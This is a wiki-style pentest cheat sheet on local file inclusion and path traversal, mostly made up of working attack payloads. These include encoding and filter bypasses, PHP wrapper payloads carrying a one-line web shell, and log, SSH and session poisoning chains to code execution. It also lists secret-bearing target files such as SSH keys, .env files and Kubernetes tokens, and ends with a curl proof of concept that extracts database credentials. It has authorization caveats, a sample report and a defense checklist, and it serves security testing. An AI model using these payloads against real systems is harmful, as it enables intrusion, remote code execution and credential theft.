---
type: wiki
category: attack
tool: lfisuite,burp,manual
status: active
last-updated: 2026-04-21
---

# LFI / Path Traversal Deep Dive (2026 Edition)

> **Purpose:** Reading arbitrary files (P2-P3). If it can be combined with log poisoning / session files / PHP wrappers → RCE (P1). Behind the simple `../../../` there are 20+ bypass techniques.

## 0. Basics

```
?file=../../etc/passwd
?file=..\..\windows\win.ini
?file=/etc/passwd
?file=file:///etc/passwd
```

But WAFs / input validation will block these — this document lists the full range of bypasses.

## 1. Traditional Bypasses

### 1.1 Encoding

```
../                      standard
..%2f                    URL encoded
..%252f                  Double URL encoded
%2e%2e%2f                fully encoded
%2e%2e/                  partially encoded
..%c0%af                 UTF-8 overlong (apache)
..%ef%bc%8f              fullwidth /
```

### 1.2 `..` Filtered

```
....//                   if only ".." is removed once
.%252e/                  double encoded
.\./                     mixed with backslash
```

### 1.3 Null byte (PHP < 5.3.4)

```
?file=../../../etc/passwd%00.jpg
```

### 1.4 When a base path is appended

When the server automatically appends `.php`:

```
?file=../../../etc/passwd%00         # old-style null byte
?file=../../../etc/passwd#           # some parsers ignore everything after #
?file=../../../etc/passwd/.          # bypass with extra .
?file=../../../etc/passwd?.php       # some parsers treat ? as a URL query
```

### 1.5 Path normalization differences

```
?file=/./etc/./passwd
?file=/./etc/passwd/..  → resolves to /etc
?file=./../etc/passwd
```

## 2. PHP Wrappers (the big guns)

### 2.1 php://filter — reading PHP source code

```
?file=php://filter/convert.base64-encode/resource=index.php
→ base64-decode the response → get the PHP source code
```

Chain multiple filters:

```
?file=php://filter/read=string.rot13|convert.base64-encode/resource=/etc/passwd
```

### 2.2 php://input — POST body executed directly as PHP code (requires allow_url_include=On)

```bash
curl -X POST "https://target.com/?file=php://input" \
  -d '<?php system($_GET["c"]);?>'
```

### 2.3 data:// — direct RCE via data URL

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+
```

Requires `allow_url_include=On`.

### 2.4 expect:// — if the expect extension is installed (rare)

```
?file=expect://id
```

### 2.5 zip:// / phar:// — combined with an upload

```bash
# build a zip
echo '<?php system($_GET["c"]);?>' > s.php
zip x.zip s.php
# after uploading x.zip:
?file=zip:///var/www/uploads/x.zip%23s.php&c=id
# note: # must be URL-encoded as %23
```

### 2.6 phar:// chained with deserialization

See [67-deserialization.md](67-deserialization.md), Phar section.

## 3. Log Poisoning → RCE

### 3.1 Apache / Nginx access log

```
# Step 1: send a malicious UA
curl -A '<?php system($_GET["c"]);?>' https://target.com/

# Step 2: use LFI to read the log
?file=../../../var/log/apache2/access.log&c=id
→ the log content gets executed as PHP
```

**Log path list**:

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log              # failed SSH usernames = analogous to UA poisoning
/var/log/mail.log
/var/log/messages
```

### 3.2 SSH log poisoning

```
# ssh invalid:"<?php system($_GET['c']);?>"@target.com
# /var/log/auth.log logs the username, containing the PHP code
# then use LFI to read auth.log
```

### 3.3 /proc/self/environ (older Linux)

```
?file=/proc/self/environ
# if readable (most modern kernels restrict this) → put PHP code in the UA to trigger it
```

### 3.4 Session file poisoning

```
# PHP session file: /var/lib/php/sessions/sess_<PHPSESSID>
# contains user-controlled data (username, preferences)
# set username to <?php ... ?>
# LFI-read sess_xxx → executes
```

### 3.5 /proc/self/fd/<N>

```
?file=/proc/self/fd/0
?file=/proc/self/fd/5     # stdin / request body
```

## 4. LFI → SSRF (Windows)

```
?file=\\\\attacker\\share\\file         # SMB
?file=\\\\attacker@80\\x                 # webdav
```

## 5. Target File List (common targets)

### 5.1 Linux

```
/etc/passwd
/etc/shadow              # requires root
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/cwd/app.py
/proc/sched_debug        # list all processes
/root/.bash_history
/root/.ssh/id_rsa
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/var/log/apache2/access.log
/var/log/auth.log
/var/www/html/index.php  # read source to find credentials
/var/www/html/config.php
/var/www/html/.env
```

### 5.2 Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Users\<user>\.ssh\id_rsa
C:\inetpub\wwwroot\web.config
```

### 5.3 Framework config

```
/var/www/html/wp-config.php          # WordPress
/var/www/html/config/database.yml    # Rails
/app/config/parameters.yml           # Symfony
/app/.env                            # Laravel / Rails 6+
/app/config/database.yml             # Rails
/app/application.properties          # Spring Boot
/app/config.json                     # Node.js
```

### 5.4 K8s pod

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## 6. Automated Detection

### 6.1 ffuf

```bash
ffuf -u 'https://target.com/page?file=FUZZ' \
  -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 -mr 'root:|win.ini'
```

### 6.2 LFISuite

```bash
git clone https://github.com/D35m0nd142/LFISuite
python2 lfisuite.py
```

### 6.3 Nuclei LFI templates

```bash
nuclei -u https://target.com -tags lfi,traversal
```

### 6.4 Burp Pro scanner + Param Miner

## 7. Bypassing "Only Allow a Specific Path Prefix"

### 7.1 Prefix-check bypass

```python
# a naive check
if filename.startswith('/var/uploads/'):
    open(filename)
```

```
?file=/var/uploads/../../../etc/passwd
→ passes the startswith check, but the resolved path escapes it
```

### 7.2 Null byte (older languages)

```
?file=/var/uploads/%00/../../etc/passwd
```

### 7.3 Symlink attack

If uploads are allowed → upload a symlink pointing to /etc/passwd → then trigger the LFI.

### 7.4 UTF-8 overlong

```
?file=..%c0%af..%c0%afetc%c0%afpasswd     # %c0%af == /
```

## 8. Full PoC: PHP LFI → php://filter → DB Creds → RCE Chain

### Step 1: Detection

```bash
curl "https://target.com/view?page=../../../../etc/passwd"
# response contains "root:x:0:0:" → LFI confirmed
```

### Step 2: Read PHP source code

```bash
curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/config.php" \
  | base64 -d

# output
# <?php
# $DB_HOST = 'internal-db.local';
# $DB_USER = 'webapp';
# $DB_PASS = 'Supersecret123';
# ?>
```

### Step 3: Verify — do not touch the DB, just report

**Stop here.** The PoC at this point is already enough for P2-P1. Do not connect to the database.

### Step 4: If deeper testing is explicitly authorized

```bash
# connect to the internal DB over VPN
mysql -h internal-db.local -u webapp -p
# confirm the credentials are valid, proving the attack chain

# close the connection immediately afterward, do not dump data
```

### Step 5: Report

```markdown
## Vulnerability Summary
https://target.com/view?page= does not validate the file path and passes
it directly into include(), allowing arbitrary file reads via ../.
Combined with php://filter, this allows reading PHP source code, which
further exposes DB credentials that can be used to log into the internal
MySQL instance.

## PoC
[3 curl requests: passwd probe + base64 read config + redacted creds]

## Impact
- Arbitrary file read (/etc/passwd, SSH keys, app config)
- Full disclosure of PHP source code
- Hardcoded DB credentials in config.php → internal DB access (confirmed via authorized in-scope VPN testing)
- If file upload is possible → LFI → RCE (log poisoning / phar)

## Severity
P2 (LFI alone) / P1 (chained to internal DB)

## Remediation
1. Validate the path against a whitelist after calling realpath()
2. Disable allow_url_include
3. Use an ID instead of a raw path for the file parameter ({page:1} → mapped to an actual file)
4. Restrict with open_basedir
5. Log directory permissions should be approximately 700
```

## 9. Defense Checklist

```
1. Never pass user input directly into include / require / fopen
2. Whitelist filenames ({1:'about.html', 2:'contact.html'})
3. If a dynamic path is required: realpath() + startswith whitelist directory
4. Disable allow_url_include / allow_url_fopen (php.ini)
5. open_basedir limit (PHP)
6. Strict extension / MIME / magic-byte checks for file uploads (see [62])
7. Log file permissions 700 (unreadable by the non-www user)
8. SessionHandler set to a separate directory + hard-to-guess filenames
9. /proc/self/environ restricted at the kernel/container level (read_only rootfs)
```

## Related Documents

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) — combined with zip:// / phar://
- [66-ssrf-deep.md](66-ssrf-deep.md) — file:// / SSRF extension
- [67-deserialization.md](67-deserialization.md) — phar deserialization
- [75-xxe-deep.md](75-xxe-deep.md) — PHP wrapper in XXE
- PortSwigger Path Traversal: https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- LFISuite: https://github.com/D35m0nd142/LFISuite
